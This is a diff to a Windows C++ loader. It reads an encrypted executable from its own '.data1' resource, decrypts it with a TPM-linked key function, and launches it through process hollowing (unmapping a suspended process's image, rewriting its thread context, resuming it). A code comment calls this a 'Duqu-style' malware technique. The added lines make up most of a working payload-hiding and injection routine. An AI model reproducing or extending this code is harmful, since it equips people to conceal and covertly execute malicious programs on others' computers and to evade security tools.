@@ -19,6 +19,7 @@ ULONG protect(ULONG characteristics)
 HRESULT
 ExecData(PVOID pvPEData)
 {
+	HRESULT hr = S_OK;
 	PROCESS_INFORMATION pi;
 	STARTUPINFO si = { sizeof si };
 
@@ -34,7 +35,12 @@ ExecData(PVOID pvPEData)
 	pfnZwUnmapViewOfSection pZwUnmapViewOfSection = 
 		(pfnZwUnmapViewOfSection)GetProcAddress(hMod, "ZwUnmapViewOfSection");
 
-	ReadProcessMemory(pi.hProcess, PCHAR(context.Ebx) + 8, &x, sizeof x, 0);
+	hr = ReadProcessMemory(pi.hProcess, PCHAR(context.Ebx) + 8, &x, sizeof x, 0);
+	if (FAILED(hr)) {
+		/* This is bad, abort! */
+		return hr;
+	}
+
 	pZwUnmapViewOfSection(pi.hProcess, x);
 
 	PIMAGE_NT_HEADERS nt = PIMAGE_NT_HEADERS(
@@ -64,7 +70,7 @@ ExecData(PVOID pvPEData)
 	SetThreadContext(pi.hThread, &context);
 	ResumeThread(pi.hThread);
 
-	return 0;
+	return hr;
 }
 
 
@@ -79,9 +85,30 @@ int _tmain(int argc, _TCHAR* argv[])
 	/* Rewrite this compiled binary to include a ".data1" section. */
 	HRSRC resInfo = FindResource(0, L".data1", L"EXE");
 	DWORD resInfoSize = SizeofResource(0, resInfo);
+	/* 
+	 * Improvement: Duqu-style execute of resources, common malware technique. 
+	 * Read: http://blog.w4kfu.com/tag/duqu
+	 */
+	PVOID ogPEData = LockResource(LoadResource(0, resInfo));
 
 	/* Now decrypt the resource. */
+	UINT32 decPEDataSize;
+	PVOID decPEData;
+	status = TlclDecrypt(
+		keyName,
+		resInfoSize,
+		(PBYTE)ogPEData,
+		&decPEDataSize,
+		(PBYTE*) &decPEData,
+		NULL);
 
-	PVOID ogPEData = LockResource(LoadResource(0, resInfo));
+	/* Execute the descrypted resource. */
+	ExecData(decPEData);
+
+	/* Free the decrypted data? */
+	ZeroAndFree((PVOID*)&decPEData, decPEDataSize);
+	decPEDataSize = 0;
+
+	return status;
 }
 
